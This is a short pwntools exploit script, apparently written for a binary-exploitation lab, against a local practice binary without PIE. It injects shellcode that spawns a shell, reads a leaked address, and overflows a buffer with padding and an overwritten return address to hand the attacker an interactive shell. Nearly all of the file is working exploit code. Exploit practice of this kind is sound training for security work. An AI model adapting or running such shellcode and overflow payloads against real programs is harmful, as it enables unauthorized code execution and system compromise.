from pwn import *


binary = "../x86_binaries/x86_no_pie"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break main
continue
"""

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()



### EXPLOIT ###
shellcode = asm(shellcraft.sh())

# send shellcode + padding
p.send(shellcode+b'a'*(0x100-len(shellcode)))

vuln_addr = int(p.readline().strip(),16)
print(f'vuln(): {hex(vuln_addr)}')

payload = flat(
    b'a'*0x28,
    p64(elf.address+0x10cc)
)
p.sendline(payload)
p.interactive()